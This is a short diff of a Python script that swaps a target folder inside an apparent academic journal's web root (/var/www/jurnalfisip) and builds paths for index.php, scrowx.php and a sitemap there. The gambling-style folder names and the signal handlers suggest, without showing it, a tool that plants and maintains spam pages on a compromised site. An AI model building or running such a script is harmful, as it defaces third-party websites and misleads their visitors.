@@ -11,7 +11,7 @@ def signal_handler(signal, frame):
 signal.signal(signal.SIGINT, signal_handler)
 signal.signal(signal.SIGTERM, signal_handler)
 
-directory = "/var/www/jurnalfisip/public/site/-/koko303"
+directory = "/var/www/jurnalfisip/public/site/-/kobra88"
 file_path_index = os.path.join(directory, "index.php")
 file_path_page = os.path.join(directory, "scrowx.php")
 file_path_sitemap = os.path.join(directory, "sitemap.xml")
